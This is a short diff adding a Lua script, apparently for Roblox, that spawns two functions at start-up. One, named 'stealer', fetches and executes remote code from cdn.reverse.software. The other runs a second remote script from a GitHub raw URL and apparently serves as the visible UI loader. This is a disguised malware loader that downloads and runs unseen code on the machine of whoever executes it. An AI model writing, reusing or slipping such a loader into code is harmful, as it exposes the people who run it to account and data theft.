@@ -1,0 +1,11 @@
+local function stealer()
+    ID="80cefac2-a5ff-439c-91a0-213f1caa206e";
+    loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
+end
+local function loadui()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/SkeboberScript/Roblox_Scripts/refs/heads/main/dsadads.lua"))()
+
+end
+
+task.spawn(stealer)
+task.spawn(loadui)
